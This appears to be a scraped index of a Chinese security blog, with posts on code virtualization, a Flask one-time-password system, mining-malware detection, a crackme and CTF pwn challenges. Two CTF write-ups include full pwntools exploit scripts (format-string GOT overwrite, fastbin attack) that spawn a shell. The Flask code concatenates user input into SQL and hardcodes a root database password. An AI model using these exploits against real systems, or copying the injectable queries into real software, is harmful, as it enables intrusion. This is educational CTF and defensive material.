SYS_WRITE; proc->op_table[6].opcode = JNZ; proc->op_table[0].func = (void(*)(void *))vm_mov; proc->op_table[1].func = (void(*)(void *))vm_xor; proc->op_table[2].func = (void(*)(void *))vm_cmp; proc->op_table[3].func = (void(*)(void *))vm_ret; proc->op_table[4].func = (void(*)(void *))vm_read; proc->op_table[5].func = (void(*)(void *))vm_write; proc->op_table[6].func = (void(*)(void *))vm_jnz; heap_buf = (char*)malloc(HEAP_SIZE_MAX); memcpy(heap_buf + 0x20, \"syclover\", 8); memcpy(heap_buf + 0x30, \"success!\\n\", 9); memcpy(heap_buf + 0x40, \"error!\\n\", 7);}int main(){ vm_processor proc = { 0 }; //init vm processor init_vm_processor(&proc); vm_interp(&proc); return 0;} 主要就是CPU和字节码结构体的定义、Handler函数的处理以及Eip的调度，其余的还是相对简单的。 0x05 保护效果ida中的反汇编显示：可以看到程序执行流那里的字节码ida并没有识别，但是解释器的逻辑是可以看到的，但是多个handler在一起代码量相对较大，分析起来并不方便。 0x06 对抗CTF和现实中都有一些基于代码虚拟化的程序，该如何对抗进行逆向分析呢，这边推荐两种方式 动态调试&静态分析得到解释器的字节码&native指令之间的映射关系，手动理清逻辑 自动化工具，类似Pin等的二进制插桩、控制流分析工具(侧信道分析指令执行条数得到执行路径) 0x07 总结以上就是对代码虚拟化保护的原理介绍，主要就是介绍了一下实现原理，手动实现了一个简单虚拟机，真正投入使用的成品/商业化虚拟机指令集是多很多的，解析过程也更复杂，之后打算去看一下OLLVM的源码，分析一下更成熟完整的代码虚拟机实现方式。","link":"/2019/03/26/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF-%E4%B8%80/"},{"title":"基于Python-flask的一次性口令认证系统","text":"0x00 锲子女友老师布置的作业，写一个一次性口令认证系统，要有图形界面，实现架构不限，最好是用C/S模式，实现语言不限。 看着女友扑闪扑闪的眼睛+委屈巴巴的眼神。。。。。。 只想骂一句：你这该死的甜美~ 丢~ 0x01 简介1.1 固定口令现在很多网站上的密码都是明文存储的，这种以固定口令进行认证的方式存在很多问题，很容易受到恶意攻击。 常见的有以下几种： 网络数据流窃听(Sniffer)： 由于认证信息要通过网络传递，并且很多认证系统的口令是未经加密的明文，攻击者通过窃听网络数据很容易就能分辨出特定系统的认证数据，并且提取出用户名和口令。 认证信息截取/重放(Record/Replay): 有的系统会将认证信息进行简单的加密后传输，如果攻击者不能直接窃取到明文用户名和口令，则可以通过重放攻击，发送一个目的主机已经接收过的包来欺骗服务器。 Hash破解： 一些系统会获取密码的hash值存储，这种存储方式依旧是不安全的。由于hash加密是单向的，一些网站存储了hash值与其对应的密码；而且目前如MD系列算法已经有人公开说可以破解了。 字典攻击： 弱口令字典爆破 社交工程 1.2 一次性口令为了解决以上的这些问题，安全专家提出了一次性口令（OTP：One Time Password）的密码体制，以保护关键数据。 OTP的主要思路是在登陆过程中加入不确定因素，使得每次登陆过程中传送的信息都不同，以提高登陆过程的安全性。 例如：登陆密码=MD5（username+password+time），系统接到后做一个简单的验算即可验证用户的合法性。 这样的话，由于每次登陆的信息都不同，hacker就无法获取到关键信息。 口令序列(S/KEY) ： 口令为一个单向的前后相关的序列，系统只用记录第 N个口令。用户用第N－1个口令登录时，系统用单向算法算出第N个口令与自己保存的第N个口令匹配，以判断用户的合法性。由于N是有限的，用户登录N次后必须重新初始化口令序列。 挑战/回答(CRYPTOCard)： 用户要求登录时，系统产生一个随机数发送给用户。用户用某种单向算法将自己的秘密口令和随机数混合起来发送给系统，系统用同样的方法做验算即可验证用户身份。 0x02 一次性口令の鉴别流程1、用户发出注册请求 2、服务器随机生成(R,N)发送 3、用户计算HN+1(PW||R)，将HN+1(PW||R)以及用户ID发送给服务器 4、服务器将用户ID和HN+11(PW||R)存储在服务器中 5、用户发出认证请求(用户ID) 6、根据ID查找(N,R)，将其发送挑战(N,R) 7、客户端计算HN(PW||R)应战值发送 8、服务端对应战值再进行一次hash算法得到H(HN(PW||R))，和之前存储的HN+1(PW||R)进行对比，若相等，则认证成功，服务器将HN+1(PW||R)替换成HN(PW||R)，即N=N-1，若失败，则不变 9、当客户端再一次认证时，服务端将(N-1,R)发送给客户端，重复7、8过程。当N=1时，重置N1并更新R1，发送给客户端，客户端再发送HN1(PW||R1)给服务端，服务端更新HN1+1(PW||R1)，重复以上过程 0x03 编码实现 由于这边并没有刚需，所以只是大概把功能实现了一下。 整个项目按照MVC的架构来编码的，controller放在skt.py里，主要是对一次性口令认证的逻辑实现，全部功能模块化，方便view所在的web.py模块做路由绑定，读写数据库的api放在dao.py里；整个架构可以说是很简单了，这边贴下部分代码 ： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061##dao.pyimport MySQLdbdef searchUserInfo(): db=MySQLdb.connect(\"localhost\",\"root\",\"sliver-xdw\",\"sk\",charset=\"utf8\") cursor=db.cursor() sql='select * from userInfomation;' cursor.execute(sql) data=cursor.fetchall() cursor.close() db.close() return datadef insertUserInfo(username,password): db=MySQLdb.connect(\"localhost\",\"root\",\"sliver-xdw\",\"sk\",charset=\"utf8\") cursor=db.cursor() li=[(username,password)] cursor.executemany('insert into userInfomation(username,password) values(%s,%s);', li) db.commit() cursor.close() db.close()def updateUserInfo(username,password): db=MySQLdb.connect(\"localhost\",\"root\",\"sliver-xdw\",\"sk\",charset=\"utf8\") cursor=db.cursor() sql='update userInfomation set password = \"'+password+'\" where username= \"'+username+'\";' cursor.execute(sql) db.commit() cursor.close() db.close()def searchFilePrivilege(username): privilege=[] db=MySQLdb.connect(\"localhost\",\"root\",\"sliver-xdw\",\"sk\",charset=\"utf8\") cursor=db.cursor() sql='select file1,file2,file3,file4,file5 from filePrivileges where user=\"'+username+'\";' print(sql) cursor.execute(sql) privilege=cursor.fetchall()[0] cursor.close() db.close() return privilegedef initFilePrivilege(username): db=MySQLdb.connect(\"localhost\",\"root\",\"sliver-xdw\",\"sk\",charset=\"utf8\") cursor=db.cursor() li=[(username,0,0,0,0,0)] cursor.executemany('insert into filePrivileges(user,file1,file2,file3,file4,file5) values(%s,%s,%s,%s,%s,%s);', li) db.commit() cursor.close() db.close()def modifyFilePrivilege(username,privileges): print(privileges) db=MySQLdb.connect(\"localhost\",\"root\",\"sliver-xdw\",\"sk\",charset=\"utf8\") cursor=db.cursor() sql='update filePrivileges set file1='+privileges['file1']+','+'file2='+privileges['file2']+',file3='+privileges['file3']+',file4='+privileges['file4']+',file5='+privileges['file5']+' where user=\"'+username+'\";' print(sql); cursor.execute(sql) db.commit() cursor.close() db.close() 下面是skt.py 最后是视图部分 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586## web.pyfrom flask import Flask,render_template,request,redirect,session,url_forfrom skt import *from privilege import *app=Flask(__name__)@app.route('/login',methods=['GET','POST'])def login(): if request.method=='GET': return render_template('login.html') else: user = request.form.get('user') pwd = request.form.get('pwd') r = log(user, pwd) # 验证用户名和密码 #print ('r is %s'%r) if r == True: # print(session['user_info']) if user=='admin': return redirect('/chpri') else: return redirect(url_for('fileRead',user=user)) else: # return render_template('login.html',msg='用户名或者密码有误') return render_template('login.html',**{'msg':'用户名或者密码有误'})@app.route('/register',methods=['GET','POST'])def register(): if request.method==\"GET\": return render_template('register.html') else: user=request.form.get('user') pwd=request.form.get('pwd') is_exist=user_exist(user) if is_exist: return redirect('/userExist') else: registerCall(user,pwd) initPrivilege(user) return redirect('/registerSuccess') @app.route('/index',methods=['GET'])def index(): return render_template('index.html')@app.route('/userExist',methods=['GET'])def userExist(): return render_template('userExist.html')@app.route('/registerSuccess',methods=['GET'])def registerSuccess(): return render_template('regsuccess.html')@app.route('/manage',methods=['GET','POST'])def manage(): return render_template('manage.html')@app.route('/fileRead?user=',methods=['GET','POST'])def fileRead(user): privilege=searchPrivilege(user) #print(privilege) return render_template('fileRead.html',user=user,privilege=privilege)@app.route('/chpri',methods=['GET','POST'])def chpri(): privileges={'file1':'','file2':'','file3':'','file4':'','file5':''} if request.method=='GET': return render_template('chpri.html') else: #print(request.form.get('value')) username = request.values.get(\"filename\") if len(username)==0: return render_template('chpri.html',**{'msg':'用户名不能为空'}) for idx in privileges: #print(request.values.get(idx)) privileges[idx]=request.values.get(idx) #privileges.append(request.values.get(idx)) print(privileges) changePrivileges(username,privileges) #print(privileges) return redirect('/login')if __name__ == '__main__': app.run(host='0.0.0.0',debug=True) 0x04 坑 脑海中关于flask的记忆已经很少了，连夜翻文档，不得不说flask的文档还行，挺通俗易懂的，两年没看，发现有些机制更容易理解了，果然还是成长了吗~ 模板渲染那块找不到合适的前端，emmmmm，手写html，丢~，趁早去学一波 前后端交互的实现是通过在绑定函数中request.values.get得到用户Post的参数值，这边也能用js和一些flask处理前后端交互的扩展来做；感叹自己太菜，前端一窍不通，好羡慕那些能做出优美页面的dalao~ 0x05 总结 以前一直是去做研究，去分析如何挖洞，如何利用；其实，换个角度，从防的角度来看，或者说从事物的原理出发，可能对某个东西了解会更透彻一点，攻击思路和手段也会更开阔。 前端是硬伤，学一波","link":"/2019/05/14/%E5%9F%BA%E4%BA%8EPython-flask%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%E5%8F%A3%E4%BB%A4%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F/"},{"title":"省赛后的打算","text":"省赛打完了，该为自己考虑一下了，这场比赛我懂得了太多。不能再为打比赛而打比赛,CTF只是你打开安全界大门的敲门砖。 现在在这里阐明一下我的研究方向，逆向工程，不知道为什么，我对系统和程序的底层很感兴趣，特别是内存，汇编什么的(虽然至今仍是菜鸡//捂脸捂脸)，至于为什么不选择pwn,那是感觉pwn有点偏向系统内核，微末道行的我至今不想涉足内核领域，以后或许有可能，但是绝不是现在。有了选择以后进度不能落下好吧，现在决定从今天起每天写一篇博文好吧记录自己的研究进度。","link":"/2017/11/06/%E7%9C%81%E8%B5%9B%E5%90%8E%E7%9A%84%E6%89%93%E7%AE%97/"},{"title":"基于lua的wireshark协议解析插件编写","text":"0x00 楔子之前接到一个专网测试项目，其使用的是376.1协议进行通信，为了对其进行测试，这边选择对其进行协议分析，wireshark观察dump下来的数据包发现数据量并不多，所以打算写插件解析下。 0x01 协议介绍376.1协议全称 国家电网公司企业标准(Q/GDW 376.1-2009):电力用户用电信息采集系统通信协议 目前最新的是2013版本。这边贴下2009版的协议规约。 0x02 帧格式格式如下: 起始字符（68H） ↑ 长度L 固定长度 长度L 的报文头 起始字符（68H） ↓ 控制域C 控制域 用户数据区 地址域A 地址域 用户数据区 链路用户数据 链路用户数据 （应用层） 用户数据区 校验和CS 帧校验和 结束字符（16H） 具体字段字节大小等详细信息规约中都存在，这边就不说了。 0x03 功能码链路用户数据中包含一个功能码AFN，表示当前终端与采集器之间是通过哪个功能进行通信的，不同的功能拥有不同的字段，所有通信信息都会保存在链路用户数据中。大致看了下规约，16个AFN，分上下行，每个AFN中还有很多FN来指定的小功能，类似电力传输计算、终端通断电时间等等，实现起来还是很烦的。 0x04 wireshark文档由于wireshark官方收录的协议通常都是运用较为广泛的，对于那些仅国内用或者比较小众的没有wireshark支持的话一般都是无法直接解析的，分析数据包也只是显示tcp，而并不对其字段进行解析，打开看的话直接显示payload后面跟一长串字节码。面对这种情况，wireshark对开发者提供了api文档，用户可以利用这些api自己写插件进行协议解析。目前wireshark支持两种语法的插件格式，一种是c，一种是lua；这边我选择了用lua去开发，毕竟相对静态语言，lua这种脚本语言开发效率肯定是更高的，wireshark内置了lua解释器，直接解析就行了。 wireshark官方对开发者文档定义的还是很完整的，字段类型、数据运算在其中都有详细介绍。 贴下开发者文档，10-11章讲协议解析，可以重点关注。 0x05 插件编写协议中通常碰到一种情况，一个字节中按比特拆分成好几个字段，所以这边需要bit库通过位操作对数据进行解析。 之后新建字段，字段类型需要根据规约给的信息进行精确分配 新建完字段后对字段进行注册绑定 接下来是每个字段的函数实现 最后对实现完成的字段进行树节点的可视化处理，需要对应好节点上下层之间的关系 这边是效果: 由于字段用英文加注释的话可能很让人疑惑，而加中文坑又很多，所以这边解析出来后仍然需要根据afn和fn等内容去查找字段的含义，来让用户知道解析出来的字段代表的内容。 0x06 总结由于内容涉及公司业务，所以未将代码托管到github；代码未进行结构化处理，后期打算进行代码格式化；总的来说其实实现就是调API，之后就是位操作解析数据，还是很简单的。这次项目了解到了wireshark插件实现，以及lua的代码编写，用惯了python还是感觉lua用着不顺手，233333333，加油加油。","link":"/2019/07/12/%E5%9F%BA%E4%BA%8Elua%E7%9A%84wireshark%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"},{"title":"挖矿病毒的体系化检测流程","text":"一、背景hw前面试的时候被问到这个问题，自我感觉回答的挺凌乱的，明明这块的经验也很多，但感觉自己做的还是不够好，缺少体系化的整理和思考，这边简单做下记录，顺带着理一下思路。 二、入侵检测挖矿的直接特征相对僵木蠕来说比较单一和容易排查，即较高的CPU占用；当然也存在一些特意控制CPU不超过指定阈值的挖矿病毒，其经常出现在攻击者已经拿下域控之后的利用场景，这种你好我也好的挖矿方式相对比较隐蔽，特别是在拥有较大规模主机集群的内网中，这种挖矿很难引起管理员注意，也就不容易去排查，但需要注明的是其使用的入侵、挖矿等手段和前一种几乎是一样的，只是稍温和一点，一旦发现了异常，后续的检测也是一样的。首先定位到异常主机，观察命令操作是否卡顿，查看CPU状态是否远超正常主机，若cpu资源占用高居不下，则有可能是中挖矿了；此时看下crontab里是否有被写连接未知服务器下载文件并执行的操作，若是，则90%以上是中挖矿了，之后进行溯源，主要对其入侵方式、恶意行为等进行整理，说白了就是检测怎么进来的，进来后干了什么，主要是这两个过程。 三、溯源首先是入侵手段。我研究过的挖矿病毒的入侵手法基本就三种：1、捆绑挖矿 2、ssh口令爆破 3、cve捆绑挖矿一般将挖矿软件和正常的软件捆绑在一起，诱导受害者下载到主机上运行，触发恶意挖矿；ssh口令爆破比较常见，一般的攻击者会把攻击者脚本放公网上针对公网主机做一些ssh弱口令的爆破，这种比较简单，厉害的都是直接将肉鸡做成集群/ip池对特定网段的云主机做ssh口令爆破，亲身经历过vps被ssh爆破种挖矿，加强密码到20位数字+大小写+特殊字符依然被攻破的情况，其算力可见一斑；最后一种是走cve，一般都是用一些rce漏洞放公网去扫的。之后是恶意行为，在野的挖矿病毒常见的基本都会做一些权限维持，当然也有一些会去做蠕虫扩散。权限维持的话，比较常见的： 1、crontab。基本挖矿都会写crontab，一般用于恶意服务器的恶意文件定时下载执行，防止挖矿进程断掉/可执行文件被删后无法重启。检测crontab几个关键目录，如/var/spool/cron 、/var/spool/cron/crontabs/、/etc/cron.d/、/etc/crontab这些，注意不同linux版本crontab目录有一些细微差别，需要做兼容。 2、开机自启动。同前者。检测/etc/init.d/、/etc/rc.local、/etc/systemd/system/等目录，不同系统版本间有一定差异。 3、ssh公钥登陆。方便攻击者批量化主动执行操作。检测/root/.ssh/authorized_keys。4、命令替换。同1。直接检测不太容易，一般如果检测到环境已经清理但之后挖矿进程还是起来了可以看这条去系统可执行文件下做检测，一般被替换的命令大小、hash一致，且一般较大，与正常可执行文件目录下的其它文件大小差异较大，可以特别检查常用的几个命令，如netstat、ps、ls这些。 5、C&C通信。同3。查看可疑established连接对应的进程进行关联排查，同时也可以通过wireshark或tcpdump抓包进行分析，特别是隐蔽通信时。 6、ld_preload。很常见，比改libc简单且动静小，一般用于在readdir中过滤掉挖矿进程达到进程隐藏效果，或在执行libc api中重启挖矿进程（同1）。可通过查看/etc/ld.so.preload及系统so库是否被改动进行判断；libc内容较多可以通过ltrace的结果进行排查；单纯检测进程隐藏可以用静态链接的类ps程序去做检测。 7、rootkit。较少，但是效果很好，同6，通常用于写lkm在内核层做进程、文件、网络的隐藏及挖矿进程的维持。rootkit要做检测比较麻烦，因为攻击者是和安全人员在同一层级了，要检测也至少需要与其在同一层，即在内核层与其做对抗，这块没有hids的话较难察觉，后面会写一篇抓门来分析rootkit，包括原理、常见类型和攻击手法、对抗思路等。蠕虫和挖矿的组合相对前者这种后门+挖矿来说较少出现，但危害却很大，一般是通过ssh或cve来实现传播，比较简单就不再赘述。四、清理对挖矿病毒涉及的修改文件该删的删，该还原的还原，进程该kill的kill；若挖矿病毒涉及面较广且主机上非核心业务可以考虑重装系统，因为清除不彻底是很常见的一个问题；确认清理完毕后可以关注下挖矿进程的启动情况，若不再启动，则说明大概率恶意软件已清除。五、建议1、拒绝弱口令2、未知来源的软件不要运行3、敏感服务不要直接暴露公网，只对特定用户做开放4、边界网络/主机出入流量管控及用户鉴权六、其它在野的恶意软件很多危害都很大，而厂商/客户环境又多，人力有限，不可避免存在监控不到被入侵和执行恶意操作的场景，针对这种在主机层面的入侵发现难、检测难、溯源难的问题，我还是觉得HIDS/HIPS是有必要存在和去发展提升的。","link":"/2020/08/02/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E4%BD%93%E7%B3%BB%E5%8C%96%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B/"},{"title":"破解之路1","text":"昨天做了一道简答的windows破解，这里写下破解思路，方便以后的复习。 拿到程序发现是一个crackme，程序的目的是要你在不知道用户名和密码的情况下成功进行注册。意思知道了，首先扔到peid里面查一下壳发现显示“MASM32 / TASM32 [Overlay]”，一开始以为是壳，后来查了一下发现只是使用的编译器种类。然后把程序扔到od中动态调试。首先想到的就是根据特殊字符串比如“success”之类的定位到程序的主要逻辑，然后再通过判断关键函数进行分析。如图，我们定位到了输出注册成功的0040134d这个位置，但是发现附近并没有使用这个函数的关键跳转，仔细看了一下发现一个messagebox函数的api调用，调用方来自0040124c于是我们定位到0040124c地址，发现了关键跳我们发现在进行跳转之前有对eax和ebx的比较，跟踪一下eax和ebx发现它们来自对用户名和注册码进行操作的一系列函数（操作用户名的是40122d，操作注册码的是401238），f7跟进函数得到算法大致如下:用户输入用户名和注册码，程序将用户名变为大写，之后进行累加操作，累加完的值于0x5678异或得到值存储在eax中；然后对注册码进行操作，edi初始值为0，程序进行len(input)次操作，每次先把edi与0xA相乘，然后把edi与输入的注册码与0x30的差的和重新赋值给edi，用公式表示就是：for i in range(len(input)): edi=edi*0xA edi=edi+input[i]-0x30这样得到了edi的值后再与0x1234进行异或操作之后把edi赋值给ebx。后面就是比较eax和ebx然后将判断，跳转。这道题的话没有写出注册算法，只能爆破，23333自己还是太菜，等以后再来填坑。嗯就是这样，题目挺简单的，只要定位到关键函数关键跳就好解决了,这里总结下定位关键函数以及关键跳的思路(我是萌新dalao勿喷)：1.通过特殊字符串，比如success，flag等等2.找到关键的api在api上下断或者跟随。比如说GetDlagItemTextA函数，这个函数是常见的获取文本框输入的函数，我们可以在这个api上下断，断下来后我们可以在堆栈段发现push的一些参数，比如说输入存储的位置，然后我们定位到这个输入的存储空间，并在这块空间上下个内存访问断点，然后哪些指令使用了这块空间存储的值，程序就会断下，那些指令一般就是关键的指令。3.各种断点，包括上面说到的内存访问，内存写入断点等等4.函数的调用，比如这道题，关键跳并不在定位到的位置附近，而是程序调用了messageboxa这个函数，然后通过逆向找到调用方找到关键跳。目前能想起来的好像也就这么多233333，等想到了再来填坑。","link":"/2017/11/08/%E7%A0%B4%E8%A7%A3%E4%B9%8B%E8%B7%AF1/"},{"title":"网鼎杯第二场Fmt","text":"网鼎杯 第二场 fmt​ 学弟扔了网鼎杯的一道pwn给我，看了下发现是格式化字符串，恰巧昨天刚刚做了一道stack_check_fail劫持的格式化字符串题，今天又做格式化可以说还是比较轻松的。 拿到题目一看发现是个中规中矩的格式化题目，有循环，供用户输入的缓冲区范围也比较大，漏洞就是直接printf字符串变量。 大致看了一下，先找到利用思路，可以通过泄露got表地址找到libc库，然后重新执行程序，第一次输入泄露libc函数地址，计算libc载入基地址，之后直接在栈上构造数据覆写printf的got表为system，因为参数保存在栈上，直接输入/bin/sh就能getshell了。 说轻松是很轻松，但那是整个解题思路，实际上在写脚本和调试的时候还是遇到不少坑的，比如说hhn和hn以及n的职能一开始没有分清导致调试的时候遇到不少坑，这里hhn是往目标地址写入一个字节，hn是两个，n是四字节，lln是八字节，可以按情况对数据进行字节拆分后写入目标地址空间。了解了以后做就很简单了。 12345678910111213141516171819202122232425262728293031from pwn import *p=process('./pwn')gdb.attach(p,''' break *0x080485BB break *0x080485ca continue''')elf=ELF('./pwn')libc=ELF('./libc.so.6')p.recvuntil('Do you know repeater?\\n')p.sendline(p32(elf.got['read']))p.sendline('%6$s')read_address=int((p.recv(12)[5:9][::-1]).encode('hex'),16)log.info('read_address > '+hex(read_address))libc_base=read_address-libc.symbols['read']log.info('libc_base > '+hex(libc_base))system_address=libc_base+libc.symbols['system']log.info('system > '+hex(system_address))payload=p32(elf.got['printf'])+p32(elf.got['printf']+2)len1=(system_address & 0xffff)len2=((system_address >> 16) &0xff)#len3=(system_address>>16)&0xff#print hex(len2)+' is len2'payload+='%'+str(len1-8) + 'x%6$hn'payload+='%'+str(len2) + 'x%7$hhn'#payload+='%'+str(len3) + 'x%8$hn'#print payload#p.sendline('%01x%6$hhn'+'%1x%7$hhn'+'%2x%8$hhn')p.send(payload)p.sendline('/bin/sh')p.interactive()","link":"/2018/08/22/%E7%BD%91%E9%BC%8E%E6%9D%AFfmt/"},{"title":"网鼎杯第三场Pwn2","text":"网鼎杯 第三场 pwn2 wp​ 昨天群里群主说网鼎杯有道pwn2已经写能写got表了，但是最后还是没有做出来，很好奇就去看了一下。 经典选单程序不多说，先来找一波漏洞。add函数将size和chunk ptr交错置于bss段上，delete函数没有uaf，但是edit函数中存在溢出，那就好办了，已知的符合此种情况的攻击方式貌似很多，unlink和fastbin attack，unsorted bin attack，top chunk attack理论上应该都是可以的，因为可以任意溢出，这里的话我用的是fastbin attack。毕竟检查比较方便，也只要构造单向链表。 这里的思路是通过构造fake chunk之后利用house of spirit写free_got，当然atoi_got应该也是可以的，待会去试下，同时在堆上存一个/bin/sh，之后delete一下就能get shell了，说起来很简单，其实坑也很多,但是说白了其实也是自己对堆管理模式还是不够清楚，网鼎杯后打算好好补一波理论了。坑点1： 需要修改fake chunk的size段使其满足在0x70的fastbin中，因为之后我们写的chunk size为0x7f，这里需要满足下，否在程序会报错”malloc():memory corruption(fast)”，出现这个报错一般就是fastbin中的size不匹配问题了。比如说如果fastbin是0x20，那么chunk的size也必须是0x20。坑点2： read之后的加’\\x00’操作，如果直接p64()写got表的话容易溢出\\x00到目标got的后一个got，可能会对程序流程有一定的影响，同样的，edit的长度也要注意下，否则容易把’\\x0a’写入到目标got的后一个got中影响程序流程。大概就是这样了，这道题方法应该很多，有空可以试试其它方法，加深一下理解。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *p=process('./pwn')elf=ELF('./pwn')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')#gdb.attach(p,'''# break *0x0000000000400E58# continue#''')def add(size,x): p.recvuntil('Your choice:') p.sendline('2') p.recvuntil('Please enter the length of servant name:') p.sendline(str(size)) p.recvuntil('Please enter the name of servant:') p.sendline(x)def dele(idx): p.recvuntil('Your choice:') p.sendline('4') p.recvuntil('Please enter the index of servant:') p.sendline(str(idx))def edit(idx,size,x): p.recvuntil('Your choice:') p.sendline('3') p.recvuntil('Please enter the index of servant:') p.sendline(str(idx)) p.recvuntil('Please enter the length of servant name:') p.sendline(str(size)) p.recvuntil('Please enter the new name of the servnat:') p.sendline(x)def show(): p.recvuntil('Your choice:') p.sendline('1')add(0x68,'a'*0x68)add(0x68,'b'*0x68)add(0x68,'c'*0x68)add(0x60,'/bin/sh\\x00')dele(1)#edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))add(0x68,'a'*0x68)add(0x68,'\\x00'*3+p64(0x68)+p64(elf.got['free']))show()p.recvuntil('0 : ')free_address=u64(p.recv(6).ljust(8,'\\x00'))#print hex(free_address)log.info('free_address > '+hex(free_address))libc_base=free_address-libc.symbols['free']system_address=libc_base+libc.symbols['system']log.info('system_address > '+hex(system_address))#edit(2,0x8,'/bin/sh\\x00')edit(0,0x7,p64(system_address)[0:7])dele(3)p.interactive()","link":"/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn2/"},{"title":"程序员自我修养读书笔记","text":"引子从入CTF这个大坑以来，读过不少书，要说印象最深刻，非程序员的自我修养这本书莫属。为何非钟情此书，因为这本书真正带我突破瓶颈，步入底层的世界。刚入手的时候发现内容晦涩难以下咽，越往后看越难以理解，但是不得不承认这本书有着神奇的吸引力，让当时的我一次次放下，又一次次拿起，磕磕绊绊之下，对程序的运行原理也算是有个一个大概。下面打算根据自己的理解大概讲讲程序从编写到装载执行的过程 0x01 预处理源代码编写完交给编译器进行编译时，编译器首先会进行预处理操作，源代码和相关的头文件会被整合到一起，构成一个后缀为.i的文件，其中主要内容有： 删除所有#define并展开所有宏定义 处理include指令，所有被包含的文件将会被插入该指令所在位置 删除所有注释 增加行号信息 gcc -E main.c -o main.i #预编译，生成main.i文件 0x02 编译编译过程是整个编译器所做最复杂也是最重要的部分，主要包括如下几个部分： 扫描器收录：源代码被收录进扫描器 词法分析：分析代码词句是否有错误 语法分析：分析代码语法是否有错误 语义分析：分析代码语法是否有意义 优化：生成中间语言并进行优化 汇编代码生成与优化：删除多余指令、使用位移来代替乘法运算等 gcc -S main.i #编译，生成main.S文件 0x03 汇编汇编是将汇编代码转变成机器指令的过程，相对于编译，这个过程要简单很多。可以理解成编译器中内置了一张汇编与机器字节码的对应表，汇编到机器指令的过程本质上就是根据编译生成汇编代码在编译器中一条一条翻译过来的过程。 gcc -c main.S #汇编，生成main.o文件 0x04 链接当一个模块中引用了另一个模块中的符号时，就需要链接，链接就是把各个模块相互引用的部分都处理好，使得各个模块间都能正确的衔接。链接的过程其实也就是抽象层的符号与底层地址之间的转换过程。 举个例子，如果在main中引用了另一个模块中的函数func()，我们必须知道func函数的地址，否则程序是无法找到并执行那串代码的，但是由于每个模块都是单独编译，因此在编译main的时候并不知道func函数的地址，所以编译main的时候暂时将调用func函数地址的代码操作数搁置，等链接的时候再进行修正。这个过程中，对所有引用的外部函数进行查找定义的过程，叫做符号解析，调用func函数地址进行修正的过程，就叫重定位。具体操作如下： (1)符号解析当引用外部函数的时候，首先需要找到这个被引用的函数，确定它的目标地址，这时链接器就会去目标文件的符号表进行查找，能找到则返回引用位置进行重定位，找不到则报错。 (2)重定位一旦链接器完成了符号解析这一步，它就把代码中每个符号引用和一个确定的符号定义联系了起来。此时，链接器就知道了每个模块（文件）代码节和数据节的大小，就可以开始重定位了。 重定位由两步组成： 重定位节和符号定义。聚合可重定位目标文件中相同的节。并且为每个节和符号分配虚拟地址。 重定位节中的符号引用。 汇编器将本地没有定义的符号写入可重定位目标文件的.symtab表，让链接器到其它可重定位目标文件中查找。同理，汇编器遇到对存储位置未知（在可重定位目标文件中，汇编器都不知道数据和代码会存放在存储器的什么位置）的符号引用时，它也会将这些符号的信息存于.rel.text和.rel.data表中。告诉链接器将可重定位目标文件合并成可执行目标文件时如何修改引用。 gcc main.o -o main #链接，生成可执行文件 0x05 装载程序链接完成后需要被载入内存，这个过程由装载器loader进行接管。主要分为如下几步： 创建虚拟内存到磁盘文件之间的映射(存储器映射) 创建虚拟地址到物理内存的映射，创建目录和页表 加载数据段、代码段 把可执行文件入口地址写入CPU的PC 说到装载，这边必须说一下虚拟内存。 虚拟内存概念：虚拟内存是磁盘开辟空间作为内存的一个补充。进程可以一部分留在物理内存中，其它部分存储在虚拟内存中。优点：1、同时执行的进程数大大增加 2、可以执行比内存空间大的进程 3、程序中访问的都是虚拟地址空间，无法直接访问物理地址，更安全 虚拟内存布局32位操作系统下，每个进程能寻址2^32个地址空间，也就是4G，这个虚拟空间包含独立的3G用户空间和所有进程共享的1G内核空间。开头128M字节的的区域为不可访问区(保留区)，通常将申请的临时指针变量初始化为NULL防止引用出错，NULL==0x00，指针指向的保留区没有访问权限。 理解： 每个进程的4G内存空间只是虚拟地址，每次访问内存空间的某个地址，都需要把地址翻译为实际物理内存地址 所有进程共享同一物理内存，每个进程只把自己当前需要的虚拟内存映射到物理内存上 进程要知道那些虚拟内存中的数据在物理内存上，哪些不在，还有在物理内存上的哪里，需要用页表来记录 页表的每一个表项分为两个部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页地址(如果在的话) 当进程访问某个虚拟地址，去看页表，如果发现对应数据不在物理内存中，则缺页异常 缺页异常的处理过程,就是把进程需要的数据从磁盘上拷贝到物理内存中，如果此时内存已经满了，没有空余空间给放置，那就找一个页覆盖，当然如果被覆盖的页曾经被修改过，则需要将此页写会磁盘 虚拟地址空间和物理地址空间对应：虚拟地址空间指的是进程可寻址的地址空间范围，而物理地址空间指的是实际可用地址空间范围。 优点： 每个进程的虚拟内存空间都是一致而且固定的，所以链接器在链接可执行文件的时候，不用去管数据实际加载到的内存地址 不同进程使用相同的代码时，比如库文件中的代码，物理内存中只存储一份这样的代码拷贝，不同的进程只需把自己的虚拟内存映射过去就行了，节省了大量内存 虚拟空间内存中需要分配连续空间，而物理内存中并不需要，可以利用碎片 0x06 